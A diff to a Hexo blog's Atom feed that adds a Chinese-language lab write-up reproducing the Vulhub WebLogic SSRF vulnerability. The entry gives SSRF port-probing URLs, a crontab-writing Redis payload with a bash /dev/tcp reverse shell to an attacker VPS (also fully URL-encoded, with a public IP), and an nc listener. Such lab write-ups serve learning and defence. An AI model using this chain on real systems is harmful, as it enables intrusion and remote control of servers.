@@ -6,7 +6,7 @@
   <link href="https://redredredfish.github.io/atom.xml" rel="self"/>
   
   <link href="https://redredredfish.github.io/"/>
-  <updated>2021-12-06T07:19:19.216Z</updated>
+  <updated>2021-12-21T18:16:21.034Z</updated>
   <id>https://redredredfish.github.io/</id>
   
   <author>
@@ -15,6 +15,35 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>vulhub weblogic ssrf复现</title>
+    <link href="https://redredredfish.github.io/2021/11/20/vulhub-weblogic-ssrf%E5%A4%8D%E7%8E%B0/"/>
+    <id>https://redredredfish.github.io/2021/11/20/vulhub-weblogic-ssrf%E5%A4%8D%E7%8E%B0/</id>
+    <published>2021-11-19T18:05:00.000Z</published>
+    <updated>2021-12-21T18:16:21.034Z</updated>
+    
+    <content type="html"><![CDATA[<p>VPS:x.x.x.x</p><p>跳板机debian：192.168.130.129 weblogic</p><p>内网ubuntu：192.168.130.132 redis</p><p>1、operator参数可以调用外部url，由于未做限制，造成ssrf，可以借助它探测服务器端口，如下两种不同的报错</p><p><a href="http://192.168.130.129:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001">http://192.168.130.129:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001</a></p><p><a href="http://192.168.130.129:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:3389">http://192.168.130.129:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:3389</a></p><p>2、通过ssrf探测内网主机，发现内网主机192.168.130.132开启6379且存在redis未授权，可以通过http的get请求写入shell</p><p>为什么get请求能写shell</p><blockquote><p>1、redis未授权 </p></blockquote><blockquote><p>2、redis通过换行符(\r\n)来分隔命令 </p></blockquote><blockquote><p>3、目标主机开启定时任务</p></blockquote><p>3、VPS监听6666端口</p><p><code>root@iZbp1h497hkijddeblcm8jZ:~# nc -lvp 6666 Listening on [0.0.0.0] (family 0, port 6666)</code></p><p>4、get写定时任务 shell /etc/crontab</p><p><code>set 1 &quot;\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c &#39;sh -i &gt;&amp; /dev/tcp/VPS:ip/6666 0&gt;&amp;1&#39;\n\n\n\n&quot;</code></p><p><code>config set dir /etc/</code></p><p><code>config set dbfilename crontab</code></p><p><code>save</code></p><p>命令之间用\r\n分隔，url编码%0D%0A，全部url编码</p><p><code>set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20&#39;sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F47.97.50.242%2F6666%200%3E%261&#39;%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A</code></p><p>5、传参，反弹shell</p><p><strong>遇到的坑</strong></p><blockquote><p>1.定时任务不一定会执行 </p></blockquote><blockquote><p>2.不同系统定时任务目录不一样 </p></blockquote><blockquote><p>/etc/crontab #大部分linux </p></blockquote><blockquote><p>/etc/cron.d/ #ubuntu</p></blockquote><blockquote><p>/var/spool/cron/root #centOS </p></blockquote><blockquote><p>/var/spool/cron/crontabs/root #debian</p></blockquote><blockquote><p>3.不太理解README里的shell最后为啥要加个aaa</p></blockquote>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;VPS:x.x.x.x&lt;/p&gt;
+&lt;p&gt;跳板机debian：192.168.130.129 weblogic&lt;/p&gt;
+&lt;p&gt;内网ubuntu：192.168.130.132 redis&lt;/p&gt;
+&lt;p&gt;1、operator参数可以调用外部url，由于未做限制，造成ssrf，可以</summary>
+      
+    
+    
+    
+    <category term="web漏洞" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"/>
+    
+    <category term="ssrf" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/ssrf/"/>
+    
+    
+    <category term="ssrf" scheme="https://redredredfish.github.io/tags/ssrf/"/>
+    
+  </entry>
   
   <entry>
     <title>weblogic反序列化漏洞的初级理解(二)</title>
